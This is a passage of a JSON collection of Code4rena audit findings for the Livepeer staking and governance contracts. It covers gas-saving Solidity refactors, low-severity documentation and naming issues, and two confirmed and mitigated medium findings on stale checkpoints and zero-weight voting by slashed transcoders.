t.deactivationRound;\n1149:    }\n```\n\nPut the above implementation in the context of our main function and we see two similar lines in both functions.\n\n```solidity\n1146:        Transcoder storage t = transcoders[_transcoder];\n1147:        uint256 currentRound = roundsManager().currentRound();\n```\n\nThis means we are making this calls twice, one in the function being called, and the other one by the calling function.<br>\nTo avoid this, we can inline the function `isActiveTranscoder()` and refactor the code as follows:\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..34c2832 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -846,14 +846,13 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         autoCheckpoint(msg.sender)\n     {\n         uint256 currentRound = roundsManager().currentRound();\n-\n-        require(isActiveTranscoder(msg.sender), \"caller must be an active transcoder\");\n+        Transcoder storage t = transcoders[msg.sender];\n+        require(t.activationRound <= currentRound && currentRound < t.deactivationRound,\"caller must be an active transcoder\");\n         require(\n-            transcoders[msg.sender].lastRewardRound != currentRound,\n+            t.lastRewardRound != currentRound,\n             \"caller has already called reward for the current round\"\n         );\n-\n-        Transcoder storage t = transcoders[msg.sender];\n+\n         EarningsPool.Data storage earningsPool = t.earningsPoolPerRound[currentRound];\n\n         // Set last round that transcoder called reward\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1307-L1345\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27059",
      "title": "[G-03] Function `transcoderWithHint()` can be more optimized (Save 4749 Gas on average)",
      "impact": "GAS",
      "content": "\n|        | Min    | Max    | Avg    |     |\n| ------ | ------ | ------ | ------ | --- |\n| Before | - | - | 276355 |     |\n| After  | - | - | 271606 |     |\n|        |        |        |        |     |\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n485:    function transcoderWithHint(\n\n490:    ) public whenSystemNotPaused currentRoundInitialized {\n491:        require(!roundsManager().currentRoundLocked(), \"can't update transcoder params, current round is locked\");\n492:        require(MathUtils.validPerc(_rewardCut), \"invalid rewardCut percentage\");\n493:        require(MathUtils.validPerc(_feeShare), \"invalid feeShare percentage\");\n494:        require(isRegisteredTranscoder(msg.sender), \"transcoder must be registered\");\n\n496:        Transcoder storage t = transcoders[msg.sender];\n497:        uint256 currentRound = roundsManager().currentRound();\n\n499:        require(\n500:            !isActiveTranscoder(msg.sender) || t.lastRewardRound == currentRound,\n501:            \"caller can't be active or must have already called reward for the current round\"\n502:        );\n\n\n507:        if (!transcoderPool.contains(msg.sender)) {\n508:            tryToJoinActiveSet(\n509:                msg.sender,\n510:                delegators[msg.sender].delegatedAmount,\n```\n\nThe require statement  on line 499 makes a call to the function `isActiveTranscoder(msg.sender)` which has the following implementation \nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1145-L1149.\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n1145:    function isActiveTranscoder(address _transcoder) public view returns (bool) {\n1146:        Transcoder storage t = transcoders[_transcoder];\n1147:        uint256 currentRound = roundsManager().currentRound();\n1148:        return t.activationRound <= currentRound && currentRound < t.deactivationRound;\n1149:    }\n```\n\nNote the first two lines of this implementation:\n```solidity\n1146:        Transcoder storage t = transcoders[_transcoder];\n1147:        uint256 currentRound = roundsManager().currentRound();\n```\nIf we look at the calling function, `transcoderWithHint()` we are making the same calls.\n\n```solidity\n496:        Transcoder storage t = transcoders[msg.sender];\n497:        uint256 currentRound = roundsManager().currentRound();\n```\n**Additional optimizations**<br>\nOn line 494, we have a check `require(isRegisteredTranscoder(msg.sender), \"transcoder must be registered\");` that makes a function call to `isRegisteredTranscoder` which has the following implementation:\n\n```solidity\n1156:    function isRegisteredTranscoder(address _transcoder) public view returns (bool) {\n1157:        Delegator storage d = delegators[_transcoder];\n1158:        return d.delegateAddress == _transcoder && d.bondedAmount > 0;\n1159:    }\n```\n\nIn our context we pass `msg.sender` as the value for `_transcoder`. If we could inline this function, we can avoid making another state read to `delegators[msg.sender]` on the line [510](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L510) in the main function. we read it here `delegators[msg.sender].delegatedAmount,`.<br>\nSince we already cache it as `d`, referencing `d` would save us some gas.\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..3fc436b 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -491,13 +491,12 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         require(!roundsManager().currentRoundLocked(), \"can't update transcoder params, current round is locked\");\n         require(MathUtils.validPerc(_rewardCut), \"invalid rewardCut percentage\");\n         require(MathUtils.validPerc(_feeShare), \"invalid feeShare percentage\");\n-        require(isRegisteredTranscoder(msg.sender), \"transcoder must be registered\");\n+        Delegator storage d = delegators[msg.sender];\n+        require(d.delegateAddress == msg.sender && d.bondedAmount > 0,\"transcoder must be registered\");\n\n         Transcoder storage t = transcoders[msg.sender];\n         uint256 currentRound = roundsManager().currentRound();\n-\n-        require(\n-            !isActiveTranscoder(msg.sender) || t.lastRewardRound == currentRound,\n+        require(!(t.activationRound <= currentRound && currentRound < t.deactivationRound) || t.lastRewardRound == currentRound,\n             \"caller can't be active or must have already called reward for the current round\"\n         );\n\n@@ -507,7 +506,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n         if (!transcoderPool.contains(msg.sender)) {\n             tryToJoinActiveSet(\n                 msg.sender,\n-                delegators[msg.sender].delegatedAmount,\n+                d.delegatedAmount,\n                 currentRound.add(1),\n                 _newPosPrev,\n                 _newPosNext\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L842-L900\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27058",
      "title": "[G-02] Function `withdrawStake()` can be more optimized (Save 443 Gas on average)",
      "impact": "GAS",
      "content": "\n|        | Min    | Max    | Avg    |     |\n| ------ | ------ | ------ | ------ | --- |\n| Before | 104389 | 121489 | 110093 |     |\n| After  | 103946 | 121046 | 109650 |     |\n|        |        |        |        |     |\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n249:    function withdrawStake(uint256 _unbondingLockId) external whenSystemNotPaused currentRoundInitialized {\n250:        Delegator storage del = delegators[msg.sender];\n251:        UnbondingLock storage lock = del.unbondingLocks[_unbondingLockId];\n\n253:        require(isValidUnbondingLock(msg.sender, _unbondingLockId), \"invalid unbonding lock ID\");\n254:        require(\n255:            lock.withdrawRound <= roundsManager().currentRound(),\n256:            \"withdraw round must be before or equal to the current round\"\n257:        );\n```\n\n**Similar to the previous explanations with some additional refactoring**<br>\nAfter the refactoring explained in the previous case, the variable `lock.withdrawRound` was found to be called 3 times, with the 3rd call being a memory store ie `uint256 withdrawRound = lock.withdrawRound;`. We can optimize the code further by making this memory store call before we make our validations using the require statements and use the memory variable in the require statement instead of reading the `lock.withdrawRound`. In the worst case(sad path) where we fail on the 1st require check, we would only waste ~6 gas for `mstore/mload`. The benefit outweighs the cons thus we should refactor.\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..5f0e073 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -249,15 +249,15 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n     function withdrawStake(uint256 _unbondingLockId) external whenSystemNotPaused currentRoundInitialized {\n         Delegator storage del = delegators[msg.sender];\n         UnbondingLock storage lock = del.unbondingLocks[_unbondingLockId];\n-\n-        require(isValidUnbondingLock(msg.sender, _unbondingLockId), \"invalid unbonding lock ID\");\n+        uint256 withdrawRound = lock.withdrawRound;\n+        require(withdrawRound > 0,\"invalid unbonding lock ID\");\n         require(\n-            lock.withdrawRound <= roundsManager().currentRound(),\n+            withdrawRound <= roundsManager().currentRound(),\n             \"withdraw round must be before or equal to the current round\"\n         );\n\n         uint256 amount = lock.amount;\n-        uint256 withdrawRound = lock.withdrawRound;\n+\n         // Delete unbonding lock\n         delete del.unbondingLocks[_unbondingLockId];\n```\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L485-L502\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27057",
      "title": "[G-01] Function `processRebond()` can be more optimized (Save 207 Gas on average)",
      "impact": "GAS",
      "content": "\nGas benchmarks based on function `rebondWithHint()` which calls our function of interest.\n\n|        | Min    | Max | Avg   | \n| ------ | --- | ------- | ----- | \n| Before | 229425    | 231632   | 230529 \n| After  | 229218    | 231425   | 230322 \n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n1564:    function processRebond(\n1565:        address _delegator,\n1566:        uint256 _unbondingLockId,\n1567:        address _newPosPrev,\n1568:        address _newPosNext\n1569:    ) internal autoCheckpoint(_delegator) {\n1570:        Delegator storage del = delegators[_delegator];\n1571:        UnbondingLock storage lock = del.unbondingLocks[_unbondingLockId];\n\n1573:        require(isValidUnbondingLock(_delegator, _unbondingLockId), \"invalid unbonding lock ID\");\n```\n\nOf interest to us is the require statement on line 1573:<br>\n`require(isValidUnbondingLock(_delegator, _unbondingLockId), \"invalid unbonding lock ID\");`\n\nThe statement makes a function call to `isValidUnbondingLock()` which we can see its implementation on https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1167-L1170.\n\n```solidity\nFile: /contracts/bonding/BondingManager.sol\n1167:    function isValidUnbondingLock(address _delegator, uint256 _unbondingLockId) public view returns (bool) {\n1168:       // A unbonding lock is only valid if it has a non-zero withdraw round (the default value is zero)\n1169:        return delegators[_delegator].unbondingLocks[_unbondingLockId].withdrawRound > 0;\n1170:    }\n```\nNote the return statement in the above function `return delegators[_delegator].unbondingLocks[_unbondingLockId].withdrawRound > 0;`.<br>\nWe make some state reads by reading `delegators[_delegator]`.\n\nBack to our original function context, note we also made the same state read on https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L1570.\n\n```solidity\n1570:        Delegator storage del = delegators[_delegator];\n```\n\nThe require statement ends up doing the following:<br>\n`require(delegators[_delegator].unbondingLocks[_unbondingLockId].withdrawRound > 0,\"invalid unbonding lock ID\");`\n\nNote the variable `delegators[_delegator].unbondingLocks[_unbondingLockId]` is equivalent to the variable `lock` declared here  `UnbondingLock storage lock = del.unbondingLocks[_unbondingLockId];`\n\nIf we inline the function `isValidUnbondingLock()` we can avoid making this two state reads and take advantage of the already declared variable.\n\n```diff\ndiff --git a/contracts/bonding/BondingManager.sol b/contracts/bonding/BondingManager.sol\nindex 93e06ba..2482d64 100644\n--- a/contracts/bonding/BondingManager.sol\n+++ b/contracts/bonding/BondingManager.sol\n@@ -1569,8 +1569,7 @@ contract BondingManager is ManagerProxyTarget, IBondingManager {\n     ) internal autoCheckpoint(_delegator) {\n         Delegator storage del = delegators[_delegator];\n         UnbondingLock storage lock = del.unbondingLocks[_unbondingLockId];\n-\n-        require(isValidUnbondingLock(_delegator, _unbondingLockId), \"invalid unbonding lock ID\");\n+        require(lock.withdrawRound > 0,\"invalid unbonding lock ID\");\n```\n\n\nhttps://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L249-L257\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27056",
      "title": "[05] Functions need a more descriptive name",
      "impact": "LOW",
      "content": "\nSome functions say they set one thing but set something different and some function names are too ambiguous.\n\n- [`setTreasuryRewardCutRate()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L167) and [_setTreasuryRewardCutRate()](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L1176) set `nextRoundTreasuryRewardCutRate` not `treasuryRewardCutRate`\n\n- [`transcoder()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L198) and [`transcoderWithHint()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L485) are too ambiguous\n\n**[victorges (Livepeer) confirmed and commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/150#issuecomment-1721699041):**\n > **[01]**<br>\n> This is known and expected behavior, which has an explicit check in the code to guarantee consistency. An improvement could be made to the code but the current one works as expected.\n> \n> **[02]**<br>\n> Valid point on doc that oversimplifies the behavior of the field and can be confusing. In the way these fields are read, that 0 value wouldn't matter though: https://github.com/livepeer/protocol/blob/ca3f5bb7a65dedba0f6be6a341d184c48553be98/contracts/bonding/BondingManager.sol#L1159\n> \n> **[03]**<br>\n> Misleading docs. Probably a deprecated property that doesn't exist anymore. Here's the deploy code of that contract for reference: https://github.com/code-423n4/2023-08-livepeer/blob/23bd30274c4d426c4bb01da661ad3ef2480c6494/deploy/deploy_contracts.ts#L215-L230\n> \n> **[04]**<br>\n> Good docs improvements.\n> \n> **[05]**<br>\n> Valid points, but expected behavior, might not fix.\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/150#issuecomment-1730761507):**\n > **[01]**: Recommendation<br>\n> **[02]**: Recommendation<br>\n> **[03]**: Low<br>\n> **[04]**: Non-Critical<br>\n> **[05]**: Recommendation\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27055",
      "title": "[04] Typos",
      "impact": "LOW",
      "content": "\n- GovernorCountingOverriable.sol ( [#L35](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/treasury/GovernorCountingOverridable.sol#L35) , [#L59](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/treasury/GovernorCountingOverridable.sol#L59) ):\n\n```javascript\n    // @audit Typo - instead of \"specicic\" use \"specific\"\n35: // @dev Tracks state of specicic voters in a single proposal.\n\n    // @audit Typo - instead of \"abstain\" use \"against\"\n59: // @notice The required percentage of \"for\" votes in relation to the total opinionated votes (for and abstain) for\n```\n\n- BondingVotes.sol ([#L65-66](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingVotes.sol#L65-L66)):\n\n```javascript\n    // @audit Typo - instead of \"Notce that...\" use \"Notice that this is different\"\n65: // @dev Stores a list of checkpoints for the total active stake, queryable and mapped by round. Notce that\n66: // differently from bonding checkpoints, it's only accessible on the specific round. To access the checkpoint for a\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27054",
      "title": "[03] No function implemented for `setMaxEarningsClaimsRounds()`",
      "impact": "LOW",
      "content": "\nThe [constructor](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L140-L148) natspec says that `setMaxEarningsClaimsRounds()` should be called to initialize state variables post-deployment. However there is no such function implemented anywhere.\n\n```javascript\n/**\n * @notice BondingManager constructor. Only invokes constructor of base Manager contract with provided Controller address\n * @dev This constructor will not initialize any state variables besides `controller`. The following setter functions\n * should be used to initialize state variables post-deployment:\n * - setUnbondingPeriod()\n * - setNumActiveTranscoders()\n * - setMaxEarningsClaimsRounds()\n * @param _controller Address of Controller that this contract will be registered with\n */\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27053",
      "title": "[02] When removing transcoders `Transcoder.activationRound` should be set to 0 for inactive",
      "impact": "LOW",
      "content": "\nFunction [`tryToJoinActiveSet()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L1416-L1418) removes a transcoder if `transcoderPool.isFull()` however it does not set `Transcoder.activationRound` of the transcoder to 0 for inactive.\nIn [`Transcoder`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L44) struct it says if a transcoder is inactive `activationRound` should be 0.\n\n```javascript\nuint256 activationRound; // Round in which the transcoder became active - 0 if inactive\n```\n\n```javascript\ntranscoderPool.remove(lastTranscoder);\ntranscoders[lastTranscoder].deactivationRound = _activationRound; // @audit Transcoder.activationRound should be 0 - for inactive\npendingNextRoundTotalActiveStake = pendingNextRoundTotalActiveStake.sub(lastStake);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27052",
      "title": "[01] There is no way to decrease the max number of active transcoders",
      "impact": "LOW",
      "content": "\n[`setNumActiveTranscoders()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L182-L190) sets the maximum number of active transcoders however there is no way to decrease the number since [`setMaxSize()`](https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/libraries/SortedDoublyLL.sol#L36-L44) does not allow it.\n\n```javascript\nfunction setNumActiveTranscoders(uint256 _numActiveTranscoders) external onlyControllerOwner {\n    transcoderPool.setMaxSize(_numActiveTranscoders);\n\n    emit ParameterUpdate(\"numActiveTranscoders\");\n}\n```\n\n```javascript\nfunction setMaxSize(Data storage self, uint256 _size) public {\n    require(_size > self.maxSize, \"new max size must be greater than old max size\");\n\n    self.maxSize = _size;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27051",
      "title": "[M-03] `withdrawFees` does not update checkpoint",
      "impact": "MEDIUM",
      "content": "\nBondingVotes may have stale data due to missing checkpoint in `BondingManager#withdrawFees()`.\n\n### Proof of Concept\n\nThe withdrawFee function has the autoClaimEarnings modifier:\n\n```Solidity\n    function withdrawFees(address payable _recipient, uint256 _amount) external whenSystemNotPaused currentRoundInitialized autoClaimEarnings(msg.sender) {\n```\n\nwhich calls \\_autoClaimEarnings:\n\n```Solidity\nmodifier autoClaimEarnings(address _delegator) {\n        _autoClaimEarnings(_delegator);\n        _;\n```\n\nwhich calls updateDelegatorWithEarnings:\n\n```Solidity\nfunction _autoClaimEarnings(address _delegator) internal {\n        uint256 currentRound = roundsManager().currentRound();\n        uint256 lastClaimRound = delegators[_delegator].lastClaimRound;\n        if (lastClaimRound < currentRound) {\n            updateDelegatorWithEarnings(_delegator, currentRound, lastClaimRound);\n        }\n    }\n```\n\nDuring updateDelegatorWithEarnings, both delegator.lastClaimRound and delegator.bondedAmount can be assigned new values.\n\n```Solidity\n        del.lastClaimRound = _endRound;\n        // Rewards are bonded by default\n        del.bondedAmount = currentBondedAmount;\n```\n\nHowever, during the lifecycle of all these functions, \\_checkpointBondingState is never called either directly or through the autoCheckpoint modifier resulting in lastClaimRound & bondedAmount's values being stale in BondingVotes.sol.\n\n### Recommended Mitigation Steps\n\nAdd autoCheckpoint modifier to the withdrawFees function.\n\n**[victorges (Livepeer) confirmed](https://github.com/code-423n4/2023-08-livepeer-findings/issues/104#issuecomment-1720257628)**\n\n**[victorges (Livepeer) mitigated]():**\n > https://github.com/livepeer/protocol/pull/623\n\n\n\n***\n\n",
      "summary": "\nBondingVotes may have stale data due to missing checkpoint in the BondingManager#withdrawFees() function. This function has an autoClaimEarnings modifier, which calls \\_autoClaimEarnings. This, in turn, calls updateDelegatorWithEarnings, which assigns new values to the delegator.lastClaimRound and delegator.bondedAmount variables. However, \\_checkpointBondingState is never called either directly or through the autoCheckpoint modifier, resulting in lastClaimRound & bondedAmount's values being stale in BondingVotes.\n\nTo mitigate this issue, the autoCheckpoint modifier should be added to the withdrawFees function. This was confirmed by [victorges (Livepeer)], and the mitigation steps have been implemented in the [Livepeer/protocol pull request 623].\n\n[victorges (Livepeer)]: https://github.com/code-423n4/2023-08-livepeer-findings/issues/104#issuecomment-1720257628\n[Livepeer/protocol pull request 623]: https://github.com/livepeer/protocol/pull/623",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Livepeer",
      "source_link": "https://code4rena.com/reports/2023-08-livepeer",
      "github_link": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/104",
      "tags": [],
      "finders": [
        "ADM",
        "rvierdiiev",
        "twicek",
        "HChang26"
      ]
    },
    {
      "id": "27050",
      "title": "[M-02] Fully slashed transcoder can vote with 0 weight messing up the voting calculations",
      "impact": "MEDIUM",
      "content": "\nIf a transcoder gets slashed fully he can still vote with 0 amount of `weight` making any other delegated user that wants to change his vote to subtract their `weight` amount from other delegators/transcoders.\n\n### Proof of Concept\n\nIn `BondingManager.sol` any transcoder can gets slashed by a specific percentage, and that specific transcoder gets resigned and that specific percentage gets deducted from his `bondedAmount`.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L394-L411>\n\nIf any `bondedAmount` will remain then the penalty will also gets subtracted from the `delegatedAmount`, if not, nothing happens.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L412-L417>\n\nAfter that the `penalty` gets burned and the fees gets paid to the finder, if that is the case.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L420-L440>\n\nThe problem relies in the fact that a fully slashed transcoder, even if it gets resigned, he is still seen as an active transcoder in the case of voting. Let's assume this case:\n\n*   A transcoder gets fully slashed and gets resigned from the transcoder pools, getting his `bondedAmount` to 0, but he still has `delegatedAmount` to his address since nothing happens this variable.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L402-L418>\n\n*   Transcoder vote a proposal and when his weighting gets calculated [here](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/f34a3a7e5a1d698d87d517fda698d48286310bee/contracts/governance/GovernorUpgradeable.sol#L581), it will use the `_getVotes` from `GovernorVotesUpgradeable.sol`.<br>\n<https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/f34a3a7e5a1d698d87d517fda698d48286310bee/contracts/governance/extensions/GovernorVotesUpgradeable.sol#L55-L61>\n\n*   `_getVotes` calls `getPastVotes` on `BondingVotes.sol` <https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L167-L170> which returns the amount of weight specific to this transcoder and as you can see, because the transcoder has a `bondedAmount` equal to 0, the first if statement will be true and 0 will be returned.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L372-L373>\n\n*   0 weight will be passed into `_countVote` which will then be passed into `_handleVoteOverrides`.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L151>\n\n*   Then it will check if the caller is a transcoder, which will be true in our case, because nowhere in the `slashTranscoder` function, or any other function the transcoder `delegateAddress` gets changed, so this if statement will be true <https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L182-L184>, which will try to deduct the weight from any previous delegators.<br>\n<https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L184-L189>\n\n*   If any delegator already overridden any amount this subtraction would revert, but if that is not the case, 0 weight will be returned, which is then used to vote `for`, `against` , `abstain`, but since 0 weight is passed no changed will be made.\n\n*   Now the big problem arise, if any delegator that delegated their votes to this specific transcoder want to change their vote, when his weight gets calculated, `delegatorCumulativeStakeAt` gets called <https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingVotes.sol#L459-L487> which will return most of the time his `bondedAmount`, amount which is greater than 0, since he didn't unbound.\n\n*   Because of that when `_handleVoteOverrides` gets called in `_countVote`, to override the vote, this if statement will be true, since the transcoder voted already, but with 0 weight <https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L195> and the delegator weight gets subtracted from the support that the transcoder used in his vote.\n\n*   The system in this case expects the transcoder to vote with the whole `delegatedAmount`, which will make the subtraction viable, since the weight of the delegator should be included in the full `delegatedAmount` of that specific transcoder, but since the transcoder voted with 0 weight, the subtraction would be done from other delegators/transcoders votes.\n\n*   Also this can be abused by a transcoder by voting a category which he knows will not get a lot of votes, if let's say a transcoder used his 0 weight to vote for `abstain` and every other voter will vote on `for` or `against`, every time one of his delegators want to change the vote the subtraction can revert, which will force those delegators out of the vote, until they will change their transcoder.\n\n### Recommended Mitigation Steps\n\nIf a transcoder gets fully slashed and resigned, delete his address from `delegateAddress` so he will not appear as a transcoder in the mechanism of counting the votes. If he still wants to participate in the system he can act as a delegator to another transcoder. Another solution would be to not let 0 weight votes happen, since they don't modify the vote state at all.\n\n### Assessed type\n\nGovernance\n\n**[victorges (Livepeer) confirmed and commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/194#issuecomment-1720133531):**\n > Slashing is turned off in the protocol, so this specific issue is not that important. It did point towards an issue in `BondingVotes` though in the way that the `getBondingState` function checks if transcoder is a transcoder or not and defaults to 0 when `bondedAmount` is `0`. There are other ways that this logic can be triggered (not through `slashTranscoder`) that can show inconsistencies as well, so I'm flagging this as valid for the underlying issue that it hints to, even though it does not describe a realistic scenario about how this issue could happen.\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/194#issuecomment-1722731950):**\n > I found the POC hard to follow. A coded instance would have tremendously helped, but what I gather is:\n> - fully slashed transcoder that votes will do so with 0 weight.\n> - any delegator that delegated their votes to this specific transcoder intending to change their vote may face an issue with sub overflow because `_handleVoteOverrides()` uses the slashed transcoder's `bondedAmount` instead of the 0 weight.\n> so this issue seems valid, although its premise is that the slashing functionality is in place.\n> \n> The README did not indicate that slashing was turned off, though I see it's mentioned a couple of times in the Discord channel. Should've been added in the \"Known caveats / limitations\" section.\n> \n> Hence, IMO it isn't entirely fair to wardens if I invalidate their issue because they weren't aware of this fact.\n> \n> Leaning towards a downgrade to M because of the external requirement of the active slashing mechanism, but am open to discussion.\n\n**[hickuphh3 (judge) decreased severity to Medium](https://github.com/code-423n4/2023-08-livepeer-findings/issues/194#issuecomment-1723153394)**\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2023-08-livepeer-findings/issues/194#issuecomment-1732530336):**\n > Revisiting this issue, IMO it's unreasonable to expect the sponsor to explicitly list out all the gotchas / limitations of the protocol. Some will only pop into mind through discussions with wardens, which seemed to be the case here when the slashing deprecation was mentioned a couple of times in the Discord channel.\n> \n> On the flip side, the fact remains that the slashing mechanism is part of the audit scope, and was counted towards the sLOC, plus the points I raised above. There wasn't an indication in the code that slashing had been deprecated.\n> \n> It's a difficult decision here, considering the different parties' POV. There could be some wardens who didn't submit issues related to slashing because of what was brought up in the Discord channel, and those that did (as one can see referenced above) because they didn't monitor the channel.\n\n**[victorges (Livepeer) mitigated]():**\n > https://github.com/livepeer/protocol/pull/625\n\n\n\n***\n\n",
